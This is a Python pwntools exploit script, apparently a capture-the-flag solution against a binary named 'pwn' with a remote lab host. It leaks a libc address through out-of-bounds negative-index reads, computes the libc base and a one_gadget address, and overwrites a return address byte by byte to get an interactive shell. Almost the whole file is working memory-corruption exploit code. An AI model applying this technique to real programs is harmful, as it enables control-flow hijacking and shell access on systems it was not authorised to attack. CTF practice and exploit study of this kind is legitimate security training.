# coding:UTF-8
from pwn import *
context(os='linux',arch='amd64')

global a
a=2

Debug = 1

if Debug:
    io=process('./pwn')
else:
    io=remote('1b190bf34e999d7f752a35fa9ee0d911.kr-lab.com',57856)

pause()

addr='0x'
io.recvuntil('input your name \nname:')
io.sendline('iopr')

for i in range(51,57):
    io.recvuntil("input index\n")
    io.sendline('-'+str(i))
    io.recvuntil('now value(hex) ')
    data=io.recvuntil('\n')[-3:-1:]
    #
    print data
    #
    if len(data)==1:
        data='0'+data
    addr+=data
    #
    print addr
    #
    io.recvuntil('input new value\n')
    tmp=eval('0x'+data)
    print tmp
    io.sendline(str(tmp))

libc_puts=0x000000000006F690
libc=eval(addr)-0x16a-libc_puts
one_gadget=libc+0x45216
print "libc -> "+hex(libc)

libc_puts=0x000000000006F690
libc=eval(addr)-0x16a-libc_puts
one_gadget=libc+0x45216
print "libc -> "+hex(libc)

'''
for i in range(29):
    io.recvuntil("input index\n")
    io.sendline('0')
    io.recvuntil('input new value\n')
    io.sendline('0')
'''

for i in range(349,343,-1):
    io.recvuntil("input index\n")
    io.sendline(str(i))
    io.recvuntil('input new value\n')
    one_gadget=hex(eval(str(one_gadget)))
    print 'one_gadget->'+one_gadget
    tmp='0x'+one_gadget[a:a+2]
    print tmp
    tmp=eval(tmp)
    print tmp
    io.sendline(str(tmp))
    a=a+2

io.interactive()

'''
io.recvuntil('do you want continue(yes/no)? \n')
io.sendline('no')
io.interactive()
00007FB001F5E7FA
'''